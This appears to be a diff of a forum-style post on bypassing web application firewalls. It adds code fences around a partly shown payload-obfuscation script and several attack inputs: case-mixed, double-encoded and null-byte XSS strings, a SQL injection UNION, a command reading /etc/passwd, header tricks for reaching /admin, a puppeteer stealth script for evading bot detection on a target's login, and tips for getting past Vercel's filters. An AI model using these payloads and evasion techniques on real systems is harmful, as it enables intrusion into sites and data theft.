@@ -49,6 +49,7 @@ the python obfuscator
 
 I got sick of doing all this by hand in Burp so i wrote a quick script. You give it a payload and it spits out a bunch of obfuscated versions using random combinations of the techniques above. Every run is different because of the random sampling so you can just keep firing it until something sticks.
 
+```
 #!/usr/bin/env python3
 # waf_bypass.py
 import urllib.parse
@@ -117,6 +118,7 @@ if __name__ == "__main__":
     run("<script>alert(1)</script>", 6)
     run("1' UNION SELECT 1,2,3--", 5)
     run("/bin/cat /etc/passwd", 4)
+```
 
 Just run it with python3 and swap the payloads at the bottom for whatever you're testing. I've been thinking about adding IBM037 encoding and null bytes but honestly this covers like 80% of what i need on a given day.
 
@@ -126,15 +128,19 @@ vantyx
 
 Some stuff i don't even need the script for:
 
+```
 <ScRiPt>+-+-alert(1)-+-+</sCrIpT>
 %253Cscript%253Ealert(1)%253C%252Fscript%253E
 <scri%00pt>alert(1)</scri%00pt>
+```
 
 And those headers i mentioned:
 
+```
 X-Forwarded-For: 127.0.0.1
 X-Original-URL: /admin
 X-Rewrite-URL: /admin
+```
 
 The X-Original-URL and X-Rewrite-URL ones are underrated. Some WAFs only check the main URL path but certain reverse proxies (including some Vercel configs) will rewrite the path from those headers. So the WAF sees / and the backend sees /admin. Pretty cool when it works.
 
@@ -158,6 +164,7 @@ vantyx
 
 header copying. You just point it at whatever target you're testing and it handles the rest.
 
+```
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
@@ -225,10 +232,13 @@ vantyx
     await browser.close();
     console.log('[*] done');
 })();
+```
 
 To set it up, run npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth and then pass the target URL and API endpoint as arguments:
 
+```
 node bypass.js "https://target.com/login" "/api/users"
+```
 
 The stealth plugin does most of the heavy lifting. It patches a bunch of browser properties that bot detection scripts look for, things like navigator.plugins, chrome.runtime, permissions API, and a bunch of other stuff that puppeteer leaks by default. Without it, pretty much every bot detection system will catch you immediately.
 
@@ -246,7 +256,9 @@ vantyx
 
 blocked. The fix is just to set the Host header to the actual domain.
 
+```
 Host: your-app.vercel.app
+```
 
 Another one: Vercel's WAF is pretty aggressive with SQL injection patterns but weirdly lenient on XSS. I'm not sure why. Maybe because their edge functions are mostly serving API responses and they figure XSS is a client-side problem. Either way, if you're testing a Vercel app and your SQLi payloads keep getting blocked, try encoding them differently. Double URL encoding works surprisingly well here.
 
